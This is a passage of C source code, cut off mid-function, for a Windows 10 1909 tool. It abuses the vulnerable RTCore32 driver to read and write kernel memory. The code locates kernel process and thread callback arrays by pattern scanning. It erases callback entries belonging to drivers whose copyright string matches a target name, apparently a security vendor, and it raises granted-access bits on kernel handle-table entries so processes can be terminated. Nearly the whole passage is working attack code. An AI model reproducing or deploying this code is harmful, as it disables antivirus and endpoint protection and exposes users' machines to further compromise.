#include <ntstatus.h>
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#define CINTERFACE
#define COBJMACROS
#include <Windows.h>
#include <stdio.h>
#include <Shlwapi.h>
#include <NTSecAPI.h>


#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"Shlwapi.lib")
#pragma comment(lib,"User32.lib")
#pragma comment(lib,"Version.lib")
#pragma comment(lib,"advapi32.lib")

#define NT_SUCCESS(status) ((NTSTATUS)status >= 0)
#define AUTO_ERROR(func) (wprintf(L"[*] ERROR " TEXT(__FUNCTION__) L" ; " func L" 0x%08x(%d)\n",GetLastError(),GetLastError()))
#define IOCTL_REV_CR0 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_CR0 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)

BOOL needSort = TRUE;
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemProcessInformation = 5,
	SystemModuleInformation = 11,
	SystemHandleInformation = 16,
} SYSTEM_INFORMATION_CLASS, * PSYSTEM_INFORMATION_CLASS;
typedef struct _RTL_BUFFER
{
	PUCHAR Buffer;
	PUCHAR StaticBuffer;
	SIZE_T Size;
	SIZE_T StaticSize;
	SIZE_T ReservedForAllocatedSize;
	PVOID ReservedForIMalloc;
} RTL_BUFFER, * PRTL_BUFFER;
typedef struct _RTL_UNICODE_STRING_BUFFER
{
	UNICODE_STRING String;
	RTL_BUFFER ByteBuffer;
	UCHAR MinimumStaticBufferForTerminalNul[sizeof(WCHAR)];
} RTL_UNICODE_STRING_BUFFER, * PRTL_UNICODE_STRING_BUFFER;
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
}SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[ANYSIZE_ARRAY];
}SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
typedef enum _PROCESSINFOCLASS
{
	ProcessImageFileName=27,
}PROCESSINFOCLASS, * PPROCESSINFOCLASS;
typedef struct _CLIENT_ID {
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;
EXTERN_C NTSTATUS NTAPI NtQueryInformationProcess(HANDLE hProcess, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
EXTERN_C NTSYSAPI NTSTATUS NTAPI NtQuerySystemInformation(IN SYSTEM_INFORMATION_CLASS 	SystemInfoClass, OUT PVOID 	SystemInfoBuffer, IN ULONG 	SystemInfoBufferSize, OUT PULONG BytesReturned 	OPTIONAL);
EXTERN_C  VOID WINAPI RtlGetNtVersionNumbers(LPDWORD pMajor, LPDWORD pMinor, LPDWORD pBuild);
EXTERN_C NTSTATUS WINAPI RtlNtPathNameToDosPathName(ULONG Flags, PRTL_UNICODE_STRING_BUFFER Path, PULONG Type, PULONG Unknown4);
EXTERN_C VOID WINAPI RtlInitUnicodeString(PUNICODE_STRING         DestinationString,__drv_aliasesMem PCWSTR SourceString);
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PULONG);
EXTERN_C NTSTATUS NTAPI NtSuspendProcess(HANDLE);
EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE 	ProcessHandle, LONG 	ExitStatus);
EXTERN_C NTSTATUS NTAPI NtAllocateVirtualMemory(IN HANDLE 	ProcessHandle, IN OUT PVOID* UBaseAddress, IN ULONG_PTR 	ZeroBits, IN OUT PSIZE_T 	URegionSize, IN ULONG 	AllocationType, IN ULONG 	Protect);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(IN HANDLE 	ProcessHandle, IN PVOID 	BaseAddress, IN PVOID 	Buffer, IN SIZE_T 	NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten 	OPTIONAL);
EXTERN_C NTSTATUS NTAPI RtlCreateUserThread(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID);
typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;			
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR  FullPathName[256];
}RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG 	NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION 	Modules[ANYSIZE_ARRAY];
}RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;
typedef struct _DRIVER_INFO
{
	HANDLE hDevice;
	PSTR ModuleName;
	PSTR processStartaAddress;
	PSTR processEndAddress;
	PSTR threadStartaAddress;
	PSTR  threadEndAddress;
	PSTR KeServiceDescriptorTableSartAddress;
	PSTR KeServiceDescriptorTableEndAddress;
	PSTR ObProcessStartAddress;
	PSTR ObProcessEndAddress;
	PUCHAR ObProcessPattern;
	DWORD dwObProcessPattern;
	LONG ObOffset;
	PUCHAR processPattern;
	DWORD dwProcessPattern;
	PUCHAR threadPattern;
	DWORD dwthreadPattern;
	PUCHAR KeServiceDescriptorTablePattern;
	PUCHAR NtTerminateProcessPattern;
	DWORD dwNtTerminateProcessPattern;
	PUCHAR NtCreatedThreadPattern;
	DWORD dwNtCreatedThreadPattern;
	DWORD dwKeServiceDescriptorTablePattern;
	LONG processcallbackoffset;
	LONG threadcallbackoffset;
	LONG KeServiceDescriptorTableOffset;
	USHORT ObProcessPostOffset;
	USHORT ObjectTableOffset;
	USHORT TableCodeOffset;
	USHORT  GrantedAccessOffset;
	USHORT PSPROTECTIONOffset;
	USHORT ObProcessTypeCallbackListoffset;
	USHORT ActiveProcessLinksOffset;
	DWORD GrantedAccessBits;

}DRIVER_INFO, * PDRIVER_INFO;

typedef struct _RTCORE_MEMORY_READ {
	BYTE Pad0[8];
	PVOID Address;
	DWORD uk1;
	BYTE Pad1[8];
	DWORD ReadSize;
	DWORD Value;
	BYTE Pad3[16];
}RTCORE_MEMORY_READ, * PRTCORE_MEMORY_READ;
typedef LONG KPRIORITY;
typedef struct _VM_COUNTERS {
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
} VM_COUNTERS;
typedef VM_COUNTERS* PVM_COUNTERS;

typedef enum _KWAIT_REASON {
	Executive,
	FreePage,
	PageIn,
	PoolAllocation,
	DelayExecution,
	Suspended,
	UserRequest,
	WrExecutive,
	WrFreePage,
	WrPageIn,
	WrPoolAllocation,
	WrDelayExecution,
	WrSuspended,
	WrUserRequest,
	WrEventPair,
	WrQueue,
	WrLpcReceive,
	WrLpcReply,
	WrVirtualMemory,
	WrPageOut,
	WrRendezvous,
	WrKeyedEvent,
	WrTerminated,
	WrProcessInSwap,
	WrCpuRateControl,
	WrCalloutStack,
	WrKernel,
	WrResource,
	WrPushLock,
	WrMutex,
	WrQuantumEnd,
	WrDispatchInt,
	WrPreempted,
	WrYieldExecution,
	WrFastMutex,
	WrGuardedMutex,
	WrRundown,
	MaximumWaitReason
} KWAIT_REASON;
typedef struct _SYSTEM_THREAD {
#if !defined(_M_X64) || !defined(_M_ARM64) // TODO:ARM64
	LARGE_INTEGER KernelTime;
#endif
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG ContextSwitchCount;
	ULONG State;
	KWAIT_REASON WaitReason;
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
	LARGE_INTEGER unk;
#endif
} SYSTEM_THREAD, * PSYSTEM_THREAD;
typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER Reserved[3];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE ParentProcessId;
	ULONG HandleCount;
	LPCWSTR Reserved2[2];
	ULONG PrivatePageCount;
	VM_COUNTERS VirtualMemoryCounters;
	IO_COUNTERS IoCounters;
	SYSTEM_THREAD Threads[ANYSIZE_ARRAY];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

static const DWORD RTCORE_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE_MEMORY_WRITE_CODE = 0x8000204c;

PRTL_PROCESS_MODULES moduleInfos = NULL;
PWSTR disk = NULL;
DWORD dwSize = 0;
PVOID objectTable = NULL;
UCHAR PTRN_WI7_Process[] = { 0x83, 0x65, 0x30, 0x00, 0xff, 0x75, 0x20, 0xe8 };

UCHAR PTRN_W10_1909_Process[] = { 0x33, 0xff, 0x6a, 0x00, 0x8b, 0xd0, 0x8b, 0xcb, 0xe8 };
UCHAR PTRN_W10_1909_KeServiceDescriptorTable[] = { 0x8d,0x47,0x70,0x89,0x40,0x04,0x89,0x00 };
UCHAR PTRN_W10_1909_NtTerminateProcess[] = { 0x8b,0xff, 0x55, 0x8b, 0xec, 0x83, 0xec, 0x0c, 0x83, 0x7d, 0x08, 0x00 };
UCHAR PTRN_W10_1909_NtCreateThread[] = { 0x68, 0x20, 0x03, 0x00, 0x00, 0x68, 0x48 };
UCHAR PTRN_W10_1909_g_Options[] = { 0x8b, 0xc1, 0x33, 0xc9, 0xc1, 0xeb, 0x03, 0x56 };
UCHAR PTRN_W10_1909_Thread[] = { 0x33, 0xf6, 0x6a, 0x00, 0x8b, 0xd3, 0x8b, 0xcf, 0xe8 };
UCHAR PTRN_W10_1909_ObProcess[] = { 0x8d, 0x4d, 0xfc, 0x53, 0x53, 0x51, 0x8b, 0x4d, 0x08, 0xba, 0x00, 0x10 };

NTSTATUS enumDriver()
{

	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
	DWORD cbNeed;
	for (cbNeed = 0x1000; (status == STATUS_INFO_LENGTH_MISMATCH) && (moduleInfos = LocalAlloc(LPTR, cbNeed));)
	{
		status = NtQuerySystemInformation(SystemModuleInformation, moduleInfos, cbNeed, &cbNeed);
		if (!NT_SUCCESS(status))
			LocalFree(moduleInfos);
	}

	return status;
}
void SortDevice()
{
	DWORD i, j;
	RTL_PROCESS_MODULE_INFORMATION temp;

	for (i = 0; i < moduleInfos->NumberOfModules - 1; i++)
	{
		for (j = 0; j < moduleInfos->NumberOfModules - 1 - i; j++)
		{
			if (moduleInfos->Modules[j].ImageBase > moduleInfos->Modules[j + 1].ImageBase)
			{
				temp = moduleInfos->Modules[j];
				moduleInfos->Modules[j] = moduleInfos->Modules[j + 1];
				moduleInfos->Modules[j + 1] = temp;
			}
		}
	}
	needSort = FALSE;
}
BOOL GetGlobalAddress(PSTR ModuleName, PSTR StartFunction, PSTR endFunction, PUCHAR pattern, DWORD dwPattern,DWORD callback,PVOID* globalAddress)
{
	HMODULE hModule = NULL;
	DWORD offset = 0, dwSizeofImage, i;
	PVOID StartAddress, endAddress;
	BOOL result = FALSE;

	if (hModule = LoadLibraryExA(ModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES))
	{
		dwSizeofImage = ((PIMAGE_NT_HEADERS32)((PBYTE)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew))->OptionalHeader.SizeOfImage;
		StartAddress = GetProcAddress(hModule, StartFunction);
		endAddress = GetProcAddress(hModule, endFunction);
		
		for (i = 0; i <(DWORD)((PBYTE)endAddress - (PBYTE)StartAddress); i++)
		{

			if (RtlEqualMemory((PBYTE)StartAddress + i, pattern, dwPattern))
			{
				
				offset = (DWORD)((PBYTE)StartAddress - (PBYTE)hModule + i);
				break;
			}
		}
		if (offset)
		{
			for (i = 0; i < moduleInfos->NumberOfModules; i++)
			{
				if (StrStrIA(moduleInfos->Modules[i].FullPathName, ModuleName))
				{
					*globalAddress = ULongToPtr((PtrToUlong(moduleInfos->Modules[i].ImageBase) + offset + callback));
					//wprintf(L"[*] find pattern at %p\n", *globalAddress);
					result = TRUE;
					break;
				}
			}
		}
		else AUTO_ERROR(L"FindPattern");
		FreeLibrary(hModule);
	}
	else AUTO_ERROR(L"LoadLibraryExA");

	return result;
}
BOOL InitDriverInfo(DWORD build, PDRIVER_INFO pDriverInfo)
{
	BOOL status = TRUE;

	if ((pDriverInfo->hDevice = CreateFileW(L"\\\\.\\RTCore32", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL)) && (pDriverInfo->hDevice != INVALID_HANDLE_VALUE))
	{
		switch (build)
		{
	/*	case 7601:
			pDriverInfo->ModuleName = "ntkrnlpa.exe";
			pDriverInfo->processStartaAddress = "RtlUnicodeStringToAnsiString";
			pDriverInfo->processEndAddress = "ObQueryNameString";
			pDriverInfo->processPattern = PTRN_WI7_Process;
			pDriverInfo->dwProcessPattern = sizeof(PTRN_WI7_Process);
			pDriverInfo->processcallbackoffset = -4;
			break;*/
		case 18363://1909
			pDriverInfo->ModuleName = "ntoskrnl.exe";
			pDriverInfo->processStartaAddress = "PoRegisterCoalescingCallback";
			pDriverInfo->processEndAddress = "PoRequestShutdownEvent";
			pDriverInfo->threadStartaAddress = "PsSetCreateProcessNotifyRoutineEx2";
			pDriverInfo->threadEndAddress = "PsSetCreateProcessNotifyRoutine";
			pDriverInfo->KeServiceDescriptorTableSartAddress = "EmClientRuleEvaluate";
			pDriverInfo->KeServiceDescriptorTableEndAddress = "PoSetFixedWakeSource";
			pDriverInfo->KeServiceDescriptorTablePattern = PTRN_W10_1909_KeServiceDescriptorTable;
			pDriverInfo->dwKeServiceDescriptorTablePattern = sizeof(PTRN_W10_1909_KeServiceDescriptorTable);
			pDriverInfo->NtTerminateProcessPattern = PTRN_W10_1909_NtTerminateProcess;
			pDriverInfo->dwNtTerminateProcessPattern = sizeof(PTRN_W10_1909_NtTerminateProcess);
			pDriverInfo->NtCreatedThreadPattern = PTRN_W10_1909_NtCreateThread;
			pDriverInfo->dwNtCreatedThreadPattern = sizeof(PTRN_W10_1909_NtCreateThread);
			pDriverInfo->ObProcessPattern = PTRN_W10_1909_ObProcess;
			pDriverInfo->dwObProcessPattern = sizeof(PTRN_W10_1909_ObProcess);
			pDriverInfo->ObProcessStartAddress = "PcwAddInstance";
			pDriverInfo->ObProcessEndAddress = "NtQueryDirectoryFile";
			pDriverInfo->ObOffset = -4;
			pDriverInfo->KeServiceDescriptorTableOffset = -4;
			pDriverInfo->processPattern = PTRN_W10_1909_Process;
			pDriverInfo->threadPattern = PTRN_W10_1909_Thread;
			pDriverInfo->dwthreadPattern = sizeof(PTRN_W10_1909_Thread);
			pDriverInfo->threadcallbackoffset = -4;
			pDriverInfo->dwProcessPattern = sizeof(PTRN_W10_1909_Process);
			pDriverInfo->processcallbackoffset = -4;
			pDriverInfo->ObjectTableOffset = 0x15c;
			pDriverInfo->PSPROTECTIONOffset = 0x366;
			pDriverInfo->TableCodeOffset = 0x8;
			pDriverInfo->GrantedAccessOffset = 0x4;
			pDriverInfo->ActiveProcessLinksOffset = 0xb8;
			pDriverInfo->ObProcessTypeCallbackListoffset = 0x88;
			pDriverInfo->GrantedAccessBits = 0x1ffffff;
			break;
		default:
			wprintf(L"not support this version\n");
			status = FALSE;
			break;
		}
	}
	else
	{
		status = FALSE;
		AUTO_ERROR(L"CreateFileW");
	}
	return status;
}
BOOL ReadR0Code(HANDLE hDevice,DWORD size,PVOID Address,PVOID* outAddress)
{
	RTCORE_MEMORY_READ memory;
	DWORD BytesReturned;
	BOOL status = FALSE;

	RtlSecureZeroMemory(&memory, sizeof(memory));
	memory.Address = Address;
	memory.ReadSize = size;

	if (DeviceIoControl(hDevice, RTCORE_MEMORY_READ_CODE, &memory, sizeof(memory), &memory, sizeof(memory), &BytesReturned, NULL))
	{
		*outAddress = ULongToPtr(memory.Value);
		status = TRUE;
	}
	else AUTO_ERROR(L"DeviceIoControl");
	return status;
}
BOOL WriteR0Code(HANDLE hDevice, DWORD size, PVOID Address, DWORD value)
{
	RTCORE_MEMORY_READ memory;
	DWORD BytesReturned;
	BOOL status = FALSE;

	RtlSecureZeroMemory(&memory, sizeof(memory));
	memory.Address = Address;
	memory.ReadSize = size;
	memory.Value = value;

	if (DeviceIoControl(hDevice, RTCORE_MEMORY_WRITE_CODE, &memory, sizeof(memory), &memory, sizeof(memory), &BytesReturned, NULL))
	{
		status = TRUE;
	}
	return status;
}

BOOL GetPhyPath(PSTR ntPath, PWSTR* DosPath)
{
	BOOL status = FALSE;
	DWORD len = 0;
	PWSTR DriverName = NULL, ByteNtPathBuffer = NULL;
	RTL_UNICODE_STRING_BUFFER buffer;
	PSTR temp;
	wchar_t env[MAX_PATH];

	*DosPath = NULL;
	if (strstr(ntPath, "??"))
	{

		len = MultiByteToWideChar(CP_ACP, MB_COMPOSITE, ntPath, -1, NULL, 0);
		if ((DriverName = LocalAlloc(LPTR, len * sizeof(wchar_t))) &&
			(*DosPath = LocalAlloc(LPTR, (len + 1) * sizeof(wchar_t))) &&
			(ByteNtPathBuffer = LocalAlloc(LPTR, (len + 1) * sizeof(wchar_t))))
		{
			MultiByteToWideChar(CP_ACP, MB_COMPOSITE, ntPath, -1, DriverName, len);
			RtlInitUnicodeString(&buffer.String, DriverName);

			RtlCopyMemory(*DosPath, buffer.String.Buffer, buffer.String.Length);
			RtlCopyMemory(ByteNtPathBuffer, buffer.String.Buffer, buffer.String.Length);
			buffer.ByteBuffer.Buffer = (PUCHAR)(*DosPath);
			buffer.ByteBuffer.StaticBuffer = (PUCHAR)ByteNtPathBuffer;
			buffer.ByteBuffer.Size = buffer.String.Length;
			buffer.ByteBuffer.StaticSize = buffer.String.Length;
			if (NT_SUCCESS(RtlNtPathNameToDosPathName(0, &buffer, NULL, NULL)))
			{
				status = TRUE;
			}
			else
			{
				LocalFree(*DosPath);
				AUTO_ERROR(L"RtlNtPathNameToDosPathName");
			}
			LocalFree(DriverName);
			LocalFree(ByteNtPathBuffer);
		}
	}
	else if (temp = StrStrIA(ntPath, "systemroot"))
	{
		RtlSecureZeroMemory(env, sizeof(env));
		GetEnvironmentVariableW(L"SystemRoot", env, MAX_PATH);
		len = lstrlenW(env) + lstrlenA(temp);
		if (*DosPath = LocalAlloc(LPTR, len * sizeof(wchar_t)))
		{
			wsprintfW(*DosPath, L"%ws%hs", env, temp + 10);
			status = TRUE;
		}
	}


	return status;
}

void checkDriver(HANDLE hDevice, PVOID routeAddress, PVOID funcAddress, PWSTR LegalCopyrightName)
{
	DWORD i, VerinfoSize = 0;
	PWSTR DosPath = NULL, subBlock = NULL, temp;
	PVOID pBuf;
	PDWORD pTransTable;
	UINT cbTranslate;
	PWSTR pVsInfo;

	for (i = 0; i < moduleInfos->NumberOfModules; i++)
	{
		if (funcAddress < moduleInfos->Modules[i].ImageBase)
		{


			//wprintf(L"%p %p %p %hs\n", funcAddress, moduleInfos->Modules[i - 1].ImageBase, moduleInfos->Modules[i].ImageBase, moduleInfos->Modules[i - 1].FullPathName);
			break;
		}
	}
	

	if (i != moduleInfos->NumberOfModules - 1)
	{
		if (GetPhyPath(moduleInfos->Modules[i - 1].FullPathName, &DosPath))
		{
			if (VerinfoSize = GetFileVersionInfoSizeW(DosPath, 0))
			{
				if ((pBuf = LocalAlloc(LPTR, VerinfoSize + 1)) && (subBlock = LocalAlloc(LPTR, 128)))
				{
					if (GetFileVersionInfoW(DosPath, 0, VerinfoSize, pBuf))
					{
						if (VerQueryValueW(pBuf, L"\\VarFileInfo\\Translation", (LPVOID*)&pTransTable, &cbTranslate))
						{
							i = 0;
							while (i < cbTranslate / sizeof(DWORD))
							{
								wsprintfW(subBlock, L"\\StringFileInfo\\%04x%04x\\LegalCopyright", LOWORD(*(&pTransTable[i])), HIWORD(*(&pTransTable[i])));
								if (VerQueryValueW(pBuf, subBlock, (LPVOID*)&pVsInfo, &cbTranslate))
								{
									if (StrStrIW(pVsInfo, LegalCopyrightName))
									{
										if (WriteR0Code(hDevice, 4, routeAddress, 0x00000000))
										{
											wprintf(L"[*] delete %ws at %p success\n", LegalCopyrightName, funcAddress);
											break;
										}
										else AUTO_ERROR(L"WriteR0Code");
									}
									else
									{
										temp = wcsrchr(DosPath, L'\\') + 1;
										wprintf(L"[*] %ws\t%ws\n", temp, (pVsInfo[0] == 0xa9) ? pVsInfo + 1 : pVsInfo);
									}
								}
								else break;
								i++;
							}

						}
						else AUTO_ERROR(L"VerQueryValue");
					}
					else AUTO_ERROR(L"GetFileVersionInfoW");
					LocalFree(pBuf);
					LocalFree(subBlock);
				}
			}
			else AUTO_ERROR(L"GetFileVersionInfoSizeW");
			LocalFree(DosPath);
		}
	}
}

void deleteCallBack(PDRIVER_INFO driverInfo,PWSTR avnaame,PSTR startFunc,PSTR endFunc,PUCHAR pattern,DWORD dwPattern,LONG offset )
{
	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
	PVOID patternAddress, routeAddress = NULL, callBackAddress, funcAddress;

	status = enumDriver();
	if (NT_SUCCESS(status))
	{
		if (needSort)
			SortDevice();

		if (GetGlobalAddress(driverInfo->ModuleName, startFunc, endFunc, pattern, dwPattern, offset, &patternAddress))
		{
			if (ReadR0Code(driverInfo->hDevice, 4, patternAddress, &routeAddress))
			{
				wprintf(L"[*] CallBackRouteAddress: %p\n", routeAddress);
				for (unsigned int i = 0; i < 64; i++)
				{
					if (ReadR0Code(driverInfo->hDevice, 4, (PBYTE)routeAddress + (i * 4), &callBackAddress))
					{
						if (callBackAddress == NULL)
							continue;
						(DWORD)callBackAddress &= ~7;

						(PBYTE)callBackAddress += 4;
						if (ReadR0Code(driverInfo->hDevice, 4, callBackAddress, &funcAddress))
						{
							checkDriver(driverInfo->hDevice, (PBYTE)routeAddress + (i * 4), funcAddress, avnaame);
						}

					}
				}
			}
		}
		LocalFree(moduleInfos);
	}
	else wprintf(L"[*] EnumDrivers Failed 0x%08x", status);
}
NTSTATUS GetGlobalHandleTable(PVOID* handletable)
{
	DWORD cbNeed;
	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
	for (cbNeed = 0x1000; (status == STATUS_INFO_LENGTH_MISMATCH) && (*(PVOID*)handletable = LocalAlloc(LPTR, cbNeed));)
	{
		status = NtQuerySystemInformation(SystemHandleInformation, *(PVOID*)handletable, cbNeed, &cbNeed);
		if (!NT_SUCCESS(status))
			LocalFree(*(PVOID*)handletable);
	}
	return status;
}
BOOL enumDisk()
{
	BOOL status = FALSE;

	dwSize = GetLogicalDriveStringsW(0, NULL);
	if (disk = LocalAlloc(LPTR, dwSize * sizeof(wchar_t)))
	{
		if (GetLogicalDriveStringsW(dwSize, disk) == (dwSize -1))
			status = TRUE;
		else LocalFree(disk);
	}
	return status;
}
BOOL GetCurrentProcessEprocessByHandle(HANDLE hProcess, PSYSTEM_HANDLE_INFORMATION handletable, DWORD processId, PVOID* EPROCESS)
{
	BOOL status = FALSE;

	for (unsigned int i = 0; i < handletable->NumberOfHandles; i++)
	{
		if (handletable->Handles[i].ObjectTypeIndex == 7)
		{
			if (handletable->Handles[i].HandleValue == (USHORT)hProcess && handletable->Handles[i].UniqueProcessId == processId)
			{
				*EPROCESS = handletable->Handles[i].Object;
				status = TRUE;
				break;
			}
		}
	}
	return status;
}
BOOL GetDosPath(PUNICODE_STRING pFileName, PWSTR* DosPath)
{
	BOOL status = FALSE;
	DWORD i, len;
	wchar_t szDriver[10];
	wchar_t sz[MAX_PATH];

	for (i = 0; i < dwSize - 1; i += 4)
	{
		RtlSecureZeroMemory(szDriver, sizeof(szDriver));
		RtlSecureZeroMemory(sz, sizeof(sz));
		RtlCopyMemory(szDriver, disk + i, 4);
		if (szDriver[0])
		{
			QueryDosDeviceW(szDriver, sz, MAX_PATH);
			if (StrStrIW(pFileName->Buffer, sz))
			{
				len = lstrlenW(sz);
				if (*DosPath = LocalAlloc(LPTR, pFileName->MaximumLength))
				{
					RtlCopyMemory(*DosPath, szDriver, 4);
					RtlCopyMemory(*DosPath + 2, pFileName->Buffer + len, pFileName->Length - (len * sizeof(wchar_t)));
					status = TRUE;
				}
			}
		}
	}
	return status;
}
BOOL CheckProcessPath(HANDLE hProcess, PWSTR checkName)
{
	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
	BOOL re = FALSE;
	PUNICODE_STRING pFileName = NULL;
	DWORD cbNeed, dwVerSize = 0, nQuerySize = 0, i = 0;
	PWSTR dosPath = NULL, name = NULL;
	PVOID pBuf = NULL;
	PDWORD pTransTable = NULL;
	wchar_t legalCopyright[120] = { 0 };

	for (cbNeed = 0x100; (status == STATUS_INFO_LENGTH_MISMATCH) && (pFileName = LocalAlloc(LPTR, cbNeed));)
	{
		status = NtQueryInformationProcess(hProcess, ProcessImageFileName, pFileName, cbNeed, &cbNeed);
		if (!NT_SUCCESS(status))
			LocalFree(pFileName);
	}
	if (NT_SUCCESS(status))
	{
		if (GetDosPath(pFileName, &dosPath))
		{
			dwVerSize = GetFileVersionInfoSizeW(dosPath, NULL);
			if (dwVerSize && (pBuf = LocalAlloc(LPTR, dwVerSize)))
			{
				if (GetFileVersionInfoW(dosPath, 0, dwVerSize, pBuf))
				{
					if (VerQueryValueW(pBuf,L"\\VarFileInfo\\Translation", (LPVOID*)&pTransTable, &nQuerySize))
					{
						i = 0;
						while (i < (nQuerySize / sizeof(DWORD)))
						{
							RtlSecureZeroMemory(legalCopyright, sizeof(legalCopyright));
							wsprintfW(legalCopyright, L"\\StringFileInfo\\%04x%04x\\legalCopyright", LOWORD(*(PDWORD)&pTransTable[i]), HIWORD(*(PDWORD)&pTransTable[i]));
							if (VerQueryValueW(pBuf, legalCopyright, &name, &nQuerySize))
							{
								
								if (StrStrIW(name, checkName))
								{
									re = TRUE;
									break;
								}
							}
							else break;
							i++;
						}
					}
				}
				LocalFree(pBuf);
			}
			LocalFree(dosPath);
		}
		LocalFree(pFileName);
	}

	return re;
}
void addTerminatePriv(PDRIVER_INFO driverInfo, HANDLE hProcess,DWORD dwAccess)
{
	BYTE level = 0x0;
	DWORD handleTableOffset = 0, handleVValue = 0, tableSize = 0;
	PVOID targetHandleTable = NULL;
	DWORD old = 0;
	DWORD Access = 0;
	PVOID tableCode = NULL;

	if (ReadR0Code(driverInfo->hDevice, 4, UlongToPtr(PtrToUlong(objectTable) + driverInfo->TableCodeOffset), &tableCode))
	{
		level = PtrToUlong(tableCode) & 3;
		(DWORD)tableCode &= ~3;
		Access = driverInfo->GrantedAccessBits & dwAccess;
		handleVValue = PtrToUlong(hProcess) / 4;
		tableSize = 4096 / 8;
		switch (level)
		{
		case 0:
			targetHandleTable = UlongToPtr(PtrToUlong(tableCode) + handleVValue * 0x8);
			if (ReadR0Code(driverInfo->hDevice, 4, UlongToPtr(PtrToUlong(targetHandleTable) + driverInfo->GrantedAccessOffset), (PVOID*)&old))
			{
				WriteR0Code(driverInfo->hDevice, 4, UlongToPtr(PtrToUlong(targetHandleTable) + driverInfo->GrantedAccessOffset), old | Access);
			}
			break;
		case 1:
			handleTableOffset = handleVValue / tableSize;
			if (ReadR0Code(driverInfo->hDevice, 4, UlongToPtr(PtrToUlong(tableCode) + handleTableOffset * sizeof(PVOID)), &tableCode))
			{
				handleVValue -= (handleTableOffset * tableSize);
				targetHandleTable = UlongToPtr(PtrToUlong(tableCode) + handleVValue * 0x8);
				if (ReadR0Code(driverInfo->hDevice, 4, UlongToPtr(PtrToUlong(targetHandleTable) + driverInfo->GrantedAccessOffset), (PVOID*)&old))
					WriteR0Code(driverInfo->hDevice, 4, UlongToPtr(PtrToUlong(targetHandleTable) + driverInfo->GrantedAccessOffset), old | Access);
			}
			break;
		case 2:
			wprintf(L"[*] level 2 handle table not support\n");
			break;
		default:
			break;
		}

	}
}
BOOL GetSSDTIndex(PSTR FunctionName, PULONG Index)
{
	HMODULE hModule = NULL;
	DWORD old;
	PVOID fAddress = NULL;
	BOOL status = FALSE;

	hModule = GetModuleHandleW(L"ntdll");
	if (hModule)
	{
		fAddress = GetProcAddress(hModule, FunctionName);
		if (fAddress)
		{
			VirtualProtect(fAddress, 5, PAGE_EXECUTE_READWRITE, &old);
			*Index = *(PULONG)((PBYTE)fAddress + 1);
			VirtualProtect(fAddress, 5, old, &old);
			status = TRUE;
		}
	}
	return status;
}
BOOL GetKernelFuncAddress(PSTR ModuleName,PUCHAR pattern,DWORD dwPattern,PVOID* funcAddress)
{
	HMODULE hModule = NULL;
	DWORD dwSizeofImage, i, j;
	BOOL status = FALSE;

